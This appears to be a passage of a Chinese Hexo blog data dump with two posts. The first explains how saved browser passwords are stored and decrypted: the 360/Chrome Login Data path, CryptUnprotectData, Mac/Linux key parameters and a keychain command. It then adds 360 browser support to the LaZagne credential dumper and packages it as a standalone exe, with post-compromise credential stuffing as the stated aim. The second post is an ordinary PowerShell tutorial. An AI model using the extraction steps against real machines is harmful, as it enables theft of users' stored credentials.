title=\"获取浏览器原理\"></a>获取浏览器原理</h3><p>浏览器在用户输入密码登录某个网站后，会有提示询问你是否保存密码，方便下次登录</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317133729443.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317133729443\"></p>\n<p>这也存在安全问题，如果有人获得了执行shell的权限，读取浏览器中密码文件，完全可以通过撞库拿到更多的密码。</p>\n<p>下面就360浏览器介绍怎么提取密码 </p>\n<p>密码存储目录：</p>\n<p><code>%LOCALAPPDATA%\\360Chrome\\Chrome\\User Data\\Default\\Login Data</code></p>\n<p>浏览器中使用数据库的方式保存账号，密码和对应的网站</p>\n<p>通过sql管理工具打开，这里使用SQLiteStudio打开</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317135718468.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317135718468\"></p>\n<p>在WIndows上</p>\n<p>​    浏览器借助Windows内置的<code>CryptProtectData</code>函数对密码进行加密。现在，虽然这是使用三重DES算法并创建特定于用户的密钥来加密数据，但是只要您登录到与加密该数据的用户相同的帐户，就可以将其解密。功能有一个对应的API，与之相反。<code>CryptUnprotectData</code>，它解密数据。显然，这在尝试解密存储的密码时将非常有用。</p>\n<blockquote>\n<h4 id=\"Mac-Linux-Implementation\"><a href=\"#Mac-Linux-Implementation\" class=\"headerlink\" title=\"Mac/Linux Implementation\"></a>Mac/Linux Implementation</h4><p>Encryption Scheme: AES-128 CBC with a constant salt and constant iterations. The decryption key is a PBKDF2 key generated with the following:</p>\n<ul>\n<li>salt is b’saltysalt’</li>\n<li>key length is 16</li>\n<li>iv is 16 bytes of space b’ ‘ * 16</li>\n<li>on Mac OSX:<ul>\n<li>password is in keychain under Chrome Safe Storage<ul>\n<li>I use the excellent keyring package to get the password</li>\n<li>You could also use bash: security find-generic-password -w -s “Chrome Safe Storage”</li>\n</ul>\n</li>\n<li>number of iterations is 1003</li>\n</ul>\n</li>\n<li>on Linux:<ul>\n<li>password is peanuts</li>\n<li>number of iterations is 1</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<p>接下来使用调用<code>CryptUnprotectData</code>进行解密就行了，网上代码也很多</p>\n<p><strong>360浏览器和Google chrom保存密码的方式是一样的</strong></p>\n<p>比如，python提取chrom密码</p>\n<p><a href=\"https://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py\" target=\"_blank\" rel=\"noopener\">https://github.com/priyankchheda/chrome_password_grabber/blob/master/chrome.py</a></p>\n<h3 id=\"使用开发\"><a href=\"#使用开发\" class=\"headerlink\" title=\"使用开发\"></a>使用开发</h3><p>该工程使用纯py编写，流程很容易看懂，看到现在还没支持360浏览器，但是用户数也挺多的，所以尝试增加以下这个模块。</p>\n<p><strong>使用前请认真阅读ReadMe</strong></p>\n<p>安装必要的库，我这里环境是<strong>Python 2.7.13</strong></p>\n<p><code>pip install -r requirements.txt</code></p>\n<p>下面的每个文件夹都是不同软件的相关模块</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317180124260.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317180124260\"></p>\n<p>要修改浏览器模块的数据，就要修改相应模块</p>\n<p>因为有很多浏览器保存密码的方式都是形同的，这里作者分了4类 分别是<strong>chromium_based</strong> <strong>ie</strong>  <strong>mozilla</strong> <strong>ucbrowser</strong> </p>\n<p>大多数浏览器都是<strong>chromium_based</strong>格式存储密码，360浏览器也是</p>\n<p>所以只需要增加一项配置文件就行了</p>\n<p><a href=\"https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_based.py#L216\" target=\"_blank\" rel=\"noopener\">https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_based.py#L216</a></p>\n<p>在里面新加一句</p>\n<p><code>(u&#39;360ces&#39;, u&#39;{LOCALAPPDATA}\\\\360Chrome\\\\Chrome\\\\User Data&#39;),</code></p>\n<p>测试如下</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317181302873.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317181302873\"></p>\n<p>不同环境库肯定不同，这里将他打包发布</p>\n<p>可以使用py2exe或pyinstaller</p>\n<p>由于py2exe不支持python2.7了，所以这里使用pyinstaller安装</p>\n<p><code>pip install pyinstaller</code></p>\n<p>也很简单，单文件模式输出就行</p>\n<p><code>pyinstaller -F  laZagne.py</code></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317182426210.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317182426210\"></p>\n<p>最后拷贝dist下的成品exe就行了，但是因为用了import *的方式，所以很多无关的代码也写入了程序，这里暂时不能减少体积，如果要改，需要将每个py文件导入的模块细化，改为from _ import XXX 的格式，调用方式也需要修改。</p>\n"},{"title":"Powershell 官方例子","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302232152.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302232152.png","_content":"\n\n\n### powershell 官方例子说明\n\n​\t全部例子来源自[示例脚本]( https://docs.microsoft.com/zh-cn/powershell/scripting/samples/sample-scripts-for-administration?view=powershell-7 )\n\n### 使用对象\n\n#### 查看对象结构 (Get-Member)\n\n>  `Get-Process | Get-Member | Out-Host -Paging`\n\n获取进程列表，再获取他们各自的成员信息，最后按页输出\n\n>  `Get-Process | Get-Member -MemberType Properties` \n>\n> MemberType 的允许值有 AliasProperty、CodeProperty、Property、NoteProperty、ScriptProperty、Properties、PropertySet、Method、CodeMethod、ScriptMethod、Methods、ParameterizedProperty、MemberSet 以及 All。 \n\n\n\n#### 选择对象部件 (Select-Object)\n\n> `Get-CimInstance -Class Win32_LogicalDisk | Select-Object -Property Name,FreeSpace`\n\n利用WMI win32-logicaldisk类来获取服务器的磁盘空间使用率的信息，然后选择性的打印出 Name和FreeSpace两个项目\n\n但是FreeSpace是 uint64格式的\n\n```powershell\nGet-CimInstance -Class Win32_LogicalDisk |\n  Select-Object -Property Name, @{\n    label='FreeSpace Cray'\n    expression={($_.FreeSpace/1GB).ToString('F2')}\n  }\n```\n\n\n\n第一行是获取基本数据，第二行是选择对象的属性，分别是Name和一个自定义的\n\n `$_` 来指代管道中的当前对象 \n\n`ToString('F2')` 表示保留两位小数\n\n#### 从管道中删除对象 (Where-Object)\n\n```powershell\nGet-CimInstance -Class Win32_SystemDriver |\n  Where-Object {$_.State -eq \"Running\"} |\n    Where-Object {$_.StartMode -eq \"Manual\"} |\n      Format-Table -Property Name,DisplayName \n```\n`Where-Object` 作用就是筛选\n\n\n|  比较运算符  |            含义            |      示例（返回 True）       |\n| :----------: | :------------------------: | :--------------------------: |\n|     -eq      |            等于            |           1 -eq 1            |\n|     -ne      |           不等于           |           1 -ne 2            |\n|     -lt      |            小于            |           1 -lt 2            |\n|     -le      |         小于或等于         |           1 -le 2            |\n|     -gt      |            大于            |           2 -gt 1            |\n|     -ge      |         大于或等于         |           2 -ge 1            |\n|    -like     |  相似（文本的通配符比较）  |  \"file.doc\" -like \"f*.do?\"   |\n|   -notlike   | 不相似（文本的通配符比较） | \"file.doc\" -notlike \"p*.doc\" |\n|  -contains   |            包含            |      1,2,3 -contains 1       |\n| -notcontains |           不包含           |     1,2,3 -notcontains 4     |\n\n```powershell\nGet-CimInstance -Class Win32_SystemDriver |\n  Where-Object {($_.State -eq 'Running') -and ($_.StartMode -eq 'Manual')} |\n    Format-Table -Property Name,DisplayName\n```\n\n如果筛选条件有多个，可以使用逻辑运算符\n\n`Format-Table` 可以格式化最后的输出格式\n\n| Logical and；如果两侧都为 True，则返回 True | -and | (1 -eq 1) -and (2 -eq 2) |\n| :-----------------------------------------: | :--: | :----------------------: |\n| Logical or；如果某一侧为 True，则返回 True  | -or  | (1 -eq 1) -or (1 -eq 2)  |\n|       Logical not；反转 True 和 False       | -not |      -not (1 -eq 2)      |\n|       Logical not；反转 True 和 False       |  !   |        !(1 -eq 2)        |\n\n#### 对对象进行排序( Sort-Object )\n\n简单使用\n\n```powershell\nGet-ChildItem |\n  Sort-Object -Property CreationTime -Descending  |\n  #Select-Object -Property Name,CreationTime\n  Format-Table -Property Name,CreationTime\n```\n\n运用哈希排序的复杂使用\n\n```powershell\nGet-ChildItem |\n  Sort-Object -Property @{ Expression = { $_.LastWriteTime - $_.CreationTime }; Descending = $true } |\n  Format-Table -Property LastWriteTime, CreationTime\n```\n\n对目录中的文件，按最后写日期-创建日期大小进行降序排列\n\n\n\n####  创建 .NET 和 COM 对象 (New-Object)\n\n创建某些COM对象\n\n```powershell\nNew-Object -ComObject WScript.Shell\nNew-Object -ComObject WScript.Network\nNew-Object -ComObject Scripting.Dictionary\nNew-Object -ComObject Scripting.FileSystemObject\n```\n\n一个使用**WScript.Shell** 创建桌面快捷方式并执行\n\n```powershell\n$WshShell = New-Object -ComObject WScript.Shell\n$calclink = $WshShell.CreateShortcut(\"C:\\Users\\Cray\\Desktop\\calc.lnk\")\n$calclink.TargetPath = \"C:\\WINDOWS\\system32\\calc.exe\"\n$calclink.Save()\n$WshShell.run(\"C:\\Users\\Cray\\Desktop\\calc.lnk\")\n```\n\n#### 使用静态类和方法\n\n静态类不能使用New-Object来创建\n\n无需创建即可使用\n\n使用时用**[ ]**调用，通常使用静态类的静态方法\n\n```powershell\n[System.Environment] | Get-Member  #此类的详细信息\n[System.Environment] | Get-Member -Static #查看静态成员\n```\n\n调用方式使用  **::**\n\n```powershell\n[System.Environment]::OSVersion \n```\n\n还有很多静态类，比如 math\n\n```powershell\nPS> [System.Math]::Sqrt(9)\n3\nPS> [System.Math]::Pow(2,3)\n8\nPS> [System.Math]::Floor(3.3)\n3\nPS> [System.Math]::Floor(-3.3)\n-4\nPS> [System.Math]::Ceiling(3.3)\n4\nPS> [System.Math]::Ceiling(-3.3)\n-3\nPS> [System.Math]::Max(2,7)\n7\nPS> [System.Math]::Min(2,7)\n2\nPS> [System.Math]::Truncate(9.3)\n9\nPS> [System.Math]::Truncate(-9.3)\n-9\n```\n\n\n\n#### 获取 WMI 对象 (Get-CimInstance)\n\n> Windows Management Instrumentation (WMI) 是 Windows 系统管理的核心技术，因为它以统一的方式公开大量信息。 由于 WMI 可实现的效果，用于访问 WMI 对象的 PowerShell cmdlet `Get-CimInstance` 是进行实际工作最有用的对象之一 \n\n列出本机上可用的WMI类列表\n```powershell\nGet-CimClass -Namespace root/CIMV2 |\n  Where-Object CimClassName -like Win32* |\n    Select-Object CimClassName\n```\n\n使用WMI获取系统信息  Namespace 默认为 `root/CIMV2` \n\n`Get-CimInstance -Class Win32_OperatingSystem`\n\n他有很多属性，都可以查看。\n\n例如\n\n```powershell\n Get-CimInstance -Class Win32_OperatingSystem | \n select -Property Free*, @{\n label = \"TotalVirtualMemorySize\" \n expression = {($_.TotalVirtualMemorySize/1MB).ToString(\"F0\")}}  | Format-Table \n```\n\n或者下面这样都是可以的\n\n```powershell\nGet-CimInstance Win32_OperatingSystem |\nFormat-List Total*Memory*, Free*\n```\n\n### 管理计算机\n\n该节有大量关于计算机的例子，建议直接看[官方文档](https://docs.microsoft.com/zh-cn/powershell/scripting/samples/collecting-information-about-computers?view=powershell-7)\n\n> 若要完整显示具有极长名称的临时服务的名称，可能需要使用具有 AutoSize 和 Wrap 参数的 `Format-Table`，用于优化列宽并允许较长名称换行而不是被截断 ","source":"_posts/Powershell 官方例子.md","raw":"---\ntitle: Powershell 官方例子\ntags: [Shell]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302232152.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302232152.png\n\n---\n\n\n\n### powershell 官方例子说明\n\n​\t全部例子来源自[示例脚本]( https://docs.microsoft.com/zh-cn/powershell/scripting/samples/sample-scripts-for-administration?view=powershell-7 )\n\n### 使用对象\n\n#### 查看对象结构 (Get-Member)\n\n>  `Get-Process | Get-Member | Out-Host -Paging`\n\n获取进程列表，再获取他们各自的成员信息，最后按页输出\n\n>  `Get-Process | Get-Member -MemberType Properties` \n>\n> MemberType 的允许值有 AliasProperty、CodeProperty、Property、NoteProperty、ScriptProperty、Properties、PropertySet、Method、CodeMethod、ScriptMethod、Methods、ParameterizedProperty、MemberSet 以及 All。 \n\n\n\n#### 选择对象部件 (Select-Object)\n\n> `Get-CimInstance -Class Win32_LogicalDisk | Select-Object -Property Name,FreeSpace`\n\n利用WMI win32-logicaldisk类来获取服务器的磁盘空间使用率的信息，然后选择性的打印出 Name和FreeSpace两个项目\n\n但是FreeSpace是 uint64格式的\n\n```powershell\nGet-CimInstance -Class Win32_LogicalDisk |\n  Select-Object -Property Name, @{\n    label='FreeSpace Cray'\n    expression={($_.FreeSpace/1GB).ToString('F2')}\n  }\n```\n\n\n\n第一行是获取基本数据，第二行是选择对象的属性，分别是Name和一个自定义的\n\n `$_` 来指代管道中的当前对象 \n\n`ToString('F2')` 表示保留两位小数\n\n#### 从管道中删除对象 (Where-Object)\n\n```powershell\nGet-CimInstance -Class Win32_SystemDriver |\n  Where-Object {$_.State -eq \"Running\"} |\n    Where-Object {$_.StartMode -eq \"Manual\"} |\n      Format-Table -Property Name,DisplayName \n```\n`Where-Object` 作用就是筛选\n\n\n|  比较运算符  |            含义            |      示例（返回 True）       |\n| :----------: | :------------------------: | :--------------------------: |\n|     -eq      |            等于            |           1 -eq 1            |\n|     -ne      |           不等于           |           1 -ne 2            |\n|     -lt      |            小于            |           1 -lt 2            |\n|     -le      |         小于或等于         |           1 -le 2            |\n|     -gt      |            大于            |           2 -gt 1            |\n|     -ge      |         大于或等于         |           2 -ge 1            |\n|    -like     |  相似（文本的通配符比较）  |  \"file.doc\" -like \"f*.do?\"   |\n|   -notlike   | 不相似（文本的通配符比较） | \"file.doc\" -notlike \"p*.doc\" |\n|  -contains   |            包含            |      1,2,3 -contains 1       |\n| -notcontains |           不包含           |     1,2,3 -notcontains 4     |\n\n```powershell\nGet-CimInstance -Class Win32_SystemDriver |\n  Where-Object {($_.State -eq 'Running') -and ($_.StartMode -eq 'Manual')} |\n    Format-Table -Property Name,DisplayName\n```\n\n如果筛选条件有多个，可以使用逻辑运算符\n\n`Format-Table` 可以格式化最后的输出格式\n\n| Logical and；如果两侧都为 True，则返回 True | -and | (1 -eq 1) -and (2 -eq 2) |\n| :-----------------------------------------: | :--: | :----------------------: |\n| Logical or；如果某一侧为 True，则返回 True  | -or  | (1 -eq 1) -or (1 -eq 2)  |\n|       Logical not；反转 True 和 False       | -not |      -not (1 -eq 2)      |\n|       Logical not；反转 True 和 False       |  !   |        !(1 -eq 2)        |\n\n#### 对对象进行排序( Sort-Object )\n\n简单使用\n\n```powershell\nGet-ChildItem |\n  Sort-Object -Property CreationTime -Descending  |\n  #Select-Object -Property Name,CreationTime\n  Format-Table -Property Name,CreationTime\n```\n\n运用哈希排序的复杂使用\n\n```powershell\nGet-ChildItem |\n  Sort-Object -Property @{ Expression = { $_.LastWriteTime - $_.CreationTime }; Descending = $true } |\n  Format-Table -Property LastWriteTime, CreationTime\n```\n\n对目录中的文件，按最后写日期-创建日期大小进行降序排列\n\n\n\n####  创建 .NET 和 COM 对象 (New-Object)\n\n创建某些COM对象\n\n```powershell\nNew-Object -ComObject WScript.Shell\nNew-Object -ComObject WScript.Network\nNew-Object -ComObject Scripting.Dictionary\nNew-Object -ComObject Scripting.FileSystemObject\n```\n\n一个使用**WScript.Shell** 创建桌面快捷方式并执行\n\n```powershell\n$WshShell = New-Object -ComObject WScript.Shell\n$calclink = $WshShell.CreateShortcut(\"C:\\Users\\Cray\\Desktop\\calc.lnk\")\n$calclink.TargetPath = \"C:\\WINDOWS\\system32\\calc.exe\"\n$calclink.Save()\n$WshShell.run(\"C:\\Users\\Cray\\Desktop\\calc.lnk\")\n```\n\n#### 使用静态类和方法\n\n静态类不能使用New-Object来创建\n\n无需创建即可使用\n\n使用时用**[ ]**调用，通常使用静态类的静态方法\n\n```powershell\n[System.Environment] | Get-Member  #此类的详细信息\n[System.Environment] | Get-Member -Static #查看静态成员\n```\n\n调用方式使用  **::**\n\n```powershell\n[System.Environment]::OSVersion \n```\n\n还有很多静态类，比如 math\n\n```powershell\nPS> [System.Math]::Sqrt(9)\n3\nPS> [System.Math]::Pow(2,3)\n8\nPS> [System.Math]::Floor(3.3)\n3\nPS> [System.Math]::Floor(-3.3)\n-4\nPS> [System.Math]::Ceiling(3.3)\n4\nPS> [System.Math]::Ceiling(-3.3)\n-3\nPS> [System.Math]::Max(2,7)\n7\nPS> [System.Math]::Min(2,7)\n2\nPS> [System.Math]::Truncate(9.3)\n9\nPS> [System.Math]::Truncate(-9.3)\n-9\n```\n\n\n\n#### 获取 WMI 对象 (Get-CimInstance)\n\n> Windows Management Instrumentation (WMI) 是 Windows 系统管理的核心技术，因为它以统一的方式公开大量信息。 由于 WMI 可实现的效果，用于访问 WMI 对象的 PowerShell cmdlet `Get-CimInstance` 是进行实际工作最有用的对象之一 \n\n列出本机上可用的WMI类列表\n```powershell\nGet-CimClass -Namespace root/CIMV2 |\n  Where-Object CimClassName -like Win32* |\n    Select-Object CimClassName\n```\n\n使用WMI获取系统信息  Namespace 默认为 `root/CIMV2` \n\n`Get-CimInstance -Class Win32_OperatingSystem`\n\n他有很多属性，都可以查看。\n\n例如\n\n```powershell\n Get-CimInstance -Class Win32_OperatingSystem | \n select -Property Free*, @{\n label = \"TotalVirtualMemorySize\" \n expression = {($_.TotalVirtualMemorySize/1MB).ToString(\"F0\")}}  | Format-Table \n```\n\n或者下面这样都是可以的\n\n```powershell\nGet-CimInstance Win32_OperatingSystem |\nFormat-List Total*Memory*, Free*\n```\n\n### 管理计算机\n\n该节有大量关于计算机的例子，建议直接看[官方文档](https://docs.microsoft.com/zh-cn/powershell/scripting/samples/collecting-information-about-computers?view=powershell-7)\n\n> 若要完整显示具有极长名称的临时服务的名称，可能需要使用具有 AutoSize 和 Wrap 参数的 `Format-Table`，用于优化列宽并允许较长名称换行而不是被截断 ","slug":"Powershell 官方例子","published":1,"date":"2020-03-02T03:13:17.551Z","updated":"2020-03-03T10:20:58.062Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw628000lccuqtwobvn9g","content":"<h3 id=\"powershell-官方例子说明\"><a href=\"#powershell-官方例子说明\" class=\"headerlink\" title=\"powershell 官方例子说明\"></a>powershell 官方例子说明</h3><p>​    全部例子来源自<a href=\"https://docs.microsoft.com/zh-cn/powershell/scripting/samples/sample-scripts-for-administration?view=powershell-7\" target=\"_blank\" rel=\"noopener\">示例脚本</a></p>\n<h3 id=\"使用对象\"><a href=\"#使用对象\" class=\"headerlink\" title=\"使用对象\"></a>使用对象</h3><h4 id=\"查看对象结构-Get-Member\"><a href=\"#查看对象结构-Get-Member\" class=\"headerlink\" title=\"查看对象结构 (Get-Member)\"></a>查看对象结构 (Get-Member)</h4><blockquote>\n<p> <code>Get-Process | Get-Member | Out-Host -Paging</code></p>\n</blockquote>\n<p>获取进程列表，再获取他们各自的成员信息，最后按页输出</p>\n<blockquote>\n<p> <code>Get-Process | Get-Member -MemberType Properties</code> </p>\n<p>MemberType 的允许值有 AliasProperty、CodeProperty、Property、NoteProperty、ScriptProperty、Properties、PropertySet、Method、CodeMethod、ScriptMethod、Methods、ParameterizedProperty、MemberSet 以及 All。 </p>\n</blockquote>\n<h4 id=\"选择对象部件-Select-Object\"><a href=\"#选择对象部件-Select-Object\" class=\"headerlink\" title=\"选择对象部件 (Select-Object)\"></a>选择对象部件 (Select-Object)</h4><blockquote>\n<p><code>Get-CimInstance -Class Win32_LogicalDisk | Select-Object -Property Name,FreeSpace</code></p>\n</blockquote>\n<p>利用WMI win32-logicaldisk类来获取服务器的磁盘空间使用率的信息，然后选择性的打印出 Name和FreeSpace两个项目</p>\n<p>但是FreeSpace是 uint64格式的</p>\n<pre><code class=\"powershell\">Get-CimInstance -Class Win32_LogicalDisk |\n  Select-Object -Property Name, @{\n    label=&#39;FreeSpace Cray&#39;\n    expression={($_.FreeSpace/1GB).ToString(&#39;F2&#39;)}\n  }</code></pre>\n<p>第一行是获取基本数据，第二行是选择对象的属性，分别是Name和一个自定义的</p>\n<p> <code>$_</code> 来指代管道中的当前对象 </p>\n<p><code>ToString(&#39;F2&#39;)</code> 表示保留两位小数</p>\n<h4 id=\"从管道中删除对象-Where-Object\"><a href=\"#从管道中删除对象-Where-Object\" class=\"headerlink\" title=\"从管道中删除对象 (Where-Object)\"></a>从管道中删除对象 (Where-Object)</h4><pre><code class=\"powershell\">Get-CimInstance -Class Win32_SystemDriver |\n  Where-Object {$_.State -eq &quot;Running&quot;} |\n    Where-Object {$_.StartMode -eq &quot;Manual&quot;} |\n      Format-Table -Property Name,DisplayName </code></pre>\n<p><code>Where-Object</code> 作用就是筛选</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">比较运算符</th>\n<th align=\"center\">含义</th>\n<th align=\"center\">示例（返回 True）</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">-eq</td>\n<td align=\"center\">等于</td>\n<td align=\"center\">1 -eq 1</td>\n</tr>\n<tr>\n<td align=\"center\">-ne</td>\n<td align=\"center\">不等于</td>\n<td align=\"center\">1 -ne 2</td>\n</tr>\n<tr>\n<td align=\"center\">-lt</td>\n<td align=\"center\">小于</td>\n<td align=\"center\">1 -lt 2</td>\n</tr>\n<tr>\n<td align=\"center\">-le</td>\n<td align=\"center\">小于或等于</td>\n<td align=\"center\">1 -le 2</td>\n</tr>\n<tr>\n<td align=\"center\">-gt</td>\n<td align=\"center\">大于</td>\n<td align=\"center\">2 -gt 1</td>\n</tr>\n<tr>\n<td align=\"center\">-ge</td>\n<td align=\"center\">大于或等于</td>\n<td align=\"center\">2 -ge 1</td>\n</tr>\n<tr>\n<td align=\"center\">-like</td>\n<td align=\"center\">相似（文本的通配符比较）</td>\n<td align=\"center\">“file.doc” -like “f*.do?”</td>\n</tr>\n<tr>\n<td align=\"center\">-notlike</td>\n<td align=\"center\">不相似（文本的通配符比较）</td>\n<td align=\"center\">“file.doc” -notlike “p*.doc”</td>\n</tr>\n<tr>\n<td align=\"center\">-contains</td>\n<td align=\"center\">包含</td>\n<td align=\"center\">1,2,3 -contains 1</td>\n</tr>\n<tr>\n<td align=\"center\">-notcontains</td>\n<td align=\"center\">不包含</td>\n<td align=\"center\">1,2,3 -notcontains 4</td>\n</tr>\n</tbody></table>\n<pre><code class=\"powershell\">Get-CimInstance -Class Win32_SystemDriver |\n  Where-Object {($_.State -eq &#39;Running&#39;) -and ($_.StartMode -eq &#39;Manual&#39;)} |\n    Format-Table -Property Name,DisplayName</code></pre>\n<p>如果筛选条件有多个，可以使用逻辑运算符</p>\n<p><code>Format-Table</code> 可以格式化最后的输出格式</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Logical and；如果两侧都为 True，则返回 True</th>\n<th align=\"center\">-and</th>\n<th align=\"center\">(1 -eq 1) -and (2 -eq 2)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Logical or；如果某一侧为 True，则返回 True</td>\n<td align=\"center\">-or</td>\n<td align=\"center\">(1 -eq 1) -or (1 -eq 2)</td>\n</tr>\n<tr>\n<td align=\"center\">Logical not；反转 True 和 False</td>\n<td align=\"center\">-not</td>\n<td align=\"center\">-not (1 -eq 2)</td>\n</tr>\n<tr>\n<td align=\"center\">Logical not；反转 True 和 False</td>\n<td align=\"center\">!</td>\n<td align=\"center\">!(1 -eq 2)</td>\n</tr>\n</tbody></table>\n<h4 id=\"对对象进行排序-Sort-Object\"><a href=\"#对对象进行排序-Sort-Object\" class=\"headerlink\" title=\"对对象进行排序( Sort-Object )\"></a>对对象进行排序( Sort-Object )</h4><p>简单使用</p>\n<pre><code class=\"powershell\">Get-ChildItem |\n  Sort-Object -Property CreationTime -Descending  |\n  #Select-Object -Property Name,CreationTime\n  Format-Table -Property Name,CreationTime</code></pre>\n<p>运用哈希排序的复杂使用</p>\n<pre><code class=\"powershell\">Get-ChildItem |\n  Sort-Object -Property @{ Expression = { $_.LastWriteTime - $_.CreationTime }; Descending = $true } |\n  Format-Table -Property LastWriteTime, CreationTime</code></pre>\n<p>对目录中的文件，按最后写日期-创建日期大小进行降序排列</p>\n<h4 id=\"创建-NET-和-COM-对象-New-Object\"><a href=\"#创建-NET-和-COM-对象-New-Object\" class=\"headerlink\" title=\"创建 .NET 和 COM 对象 (New-Object)\"></a>创建 .NET 和 COM 对象 (New-Object)</h4><p>创建某些COM对象</p>\n<pre><code class=\"powershell\">New-Object -ComObject WScript.Shell\nNew-Object -ComObject WScript.Network\nNew-Object -ComObject Scripting.Dictionary\nNew-Object -ComObject Scripting.FileSystemObject</code></pre>\n<p>一个使用<strong>WScript.Shell</strong> 创建桌面快捷方式并执行</p>\n<pre><code class=\"powershell\">$WshShell = New-Object -ComObject WScript.Shell\n$calclink = $WshShell.CreateShortcut(&quot;C:\\Users\\Cray\\Desktop\\calc.lnk&quot;)\n$calclink.TargetPath = &quot;C:\\WINDOWS\\system32\\calc.exe&quot;\n$calclink.Save()\n$WshShell.run(&quot;C:\\Users\\Cray\\Desktop\\calc.lnk&quot;)</code></pre>\n<h4 id=\"使用静态类和方法\"><a href=\"#使用静态类和方法\" class=\"headerlink\" title=\"使用静态类和方法\"></a>使用静态类和方法</h4><p>静态类不能使用New-Object来创建</p>\n<p>无需创建即可使用</p>\n<p>使用时用<strong>[ ]</strong>调用，通常使用静态类的静态方法</p>\n<pre><code class=\"powershell\">[System.Environment] | Get-Member  #此类的详细信息\n[System.Environment] | Get-Member -Static #查看静态成员</code></pre>\n<p>调用方式使用  <strong>::</strong></p>\n<pre><code class=\"powershell\">[System.Environment]::OSVersion </code></pre>\n<p>还有很多静态类，比如 math</p>\n<pre><code class=\"powershell\">PS&gt; [System.Math]::Sqrt(9)\n3\nPS&gt; [System.Math]::Pow(2,3)\n8\nPS&gt; [System.Math]::Floor(3.3)\n3\nPS&gt; [System.Math]::Floor(-3.3)\n-4\nPS&gt; [System.Math]::Ceiling(3.3)\n4\nPS&gt; [System.Math]::Ceiling(-3.3)\n-3\nPS&gt; [System.Math]::Max(2,7)\n7\nPS&gt; [System.Math]::Min(2,7)\n2\nPS&gt; [System.Math]::Truncate(9.3)\n9\nPS&gt; [System.Math]::Truncate(-9.3)\n-9</code></pre>\n<h4 id=\"获取-WMI-对象-Get-CimInstance\"><a href=\"#获取-WMI-对象-Get-CimInstance\" class=\"headerlink\" title=\"获取 WMI 对象 (Get-CimInstance)\"></a>获取 WMI 对象 (Get-CimInstance)</h4><blockquote>\n<p>Windows Management Instrumentation (WMI) 是 Windows 系统管理的核心技术，因为它以统一的方式公开大量信息。 由于 WMI 可实现的效果，用于访问 WMI 对象的 PowerShell cmdlet <code>Get-CimInstance</code> 是进行实际工作最有用的对象之一 </p>\n</blockquote>\n<p>列出本机上可用的WMI类列表</p>\n<pre><code class=\"powershell\">Get-CimClass -Namespace root/CIMV2 |\n  Where-Object CimClassName -like Win32* |\n    Select-Object CimClassName</code></pre>\n<p>使用WMI获取系统信息  Namespace 默认为 <code>root/CIMV2</code> </p>\n<p><code>Get-CimInstance -Class Win32_OperatingSystem</code></p>\n<p>他有很多属性，都可以查看。</p>\n<p>例如</p>\n<pre><code class=\"powershell\"> Get-CimInstance -Class Win32_OperatingSystem | \n select -Property Free*, @{\n label = &quot;TotalVirtualMemorySize&quot; \n expression = {($_.TotalVirtualMemorySize/1MB).ToString(&quot;F0&quot;)}}  | Format-Table </code></pre>\n<p>或者下面这样都是可以的</p>\n<pre><code class=\"powershell\">Get-CimInstance Win32_OperatingSystem |\nFormat-List Total*Memory*, Free*</code></pre>\n<h3 id=\"管理计算机\"><a href=\"#管理计算机\" class=\"headerlink\" title=\"管理计算机\"></a>管理计算机</h3><p>该节有大量关于计算机的例子，建议直接看<a href=\"https://docs.microsoft.com/zh-cn/powershell/scripting/samples/collecting-information-about-computers?view=powershell-7\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n<blockquote>\n<p>若要完整显示具有极长名称的临时服务的名称，可能需要使用具有 AutoSize 和 Wrap 参数的 <code>Format-Table</code>，用于优化列宽并允许较长名称换行而不是被截断 </p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"powershell-官方例子说明\"><a href=\"#powershell-官方例子说明\" class=\"headerlink\" title=\"powershell 官方例子说明\"></a>powershell 官方例子说明</h3><p>​    全部例子来源自<a href=\"https://docs.microsoft.com/zh-cn/powershell/scripting/samples/sample-scripts-for-administration?view=powershell-7\" target=\"_blank\" rel=\"noopener\">示例脚本</a></p>\n<h3 id=\"使用对象\"><a href=\"#使用对象\" class=\"headerlink\" title=\"使用对象\"></a>使用对象</h3><h4 id=\"查看对象结构-Get-Member\"><a href=\"#查看对象结构-Get-Member\" class=\"headerlink\" title=\"查看对象结构 (Get-Member)\"></a>查看对象结构 (Get-Member)</h4><blockquote>\n<p> <code>Get-Process | Get-Member | Out-Host -Paging</code></p>\n</blockquote>\n<p>获取进程列表，再获取他们各自的成员信息，最后按页输出</p>\n<blockquote>\n<p> <code>Get-Process | Get-Member -MemberType Properties</code> </p>\n<p>MemberType 的允许值有 AliasProperty、CodeProperty、Property、NoteProperty、ScriptProperty、Properties、PropertySet、Method、CodeMethod、ScriptMethod、Methods、ParameterizedProperty、MemberSet 以及 All。 </p>\n</blockquote>\n<h4 id=\"选择对象部件-Select-Object\"><a href=\"#选择对象部件-Select-Object\" class=\"headerlink\" title=\"选择对象部件 (Select-Object)\"></a>选择对象部件 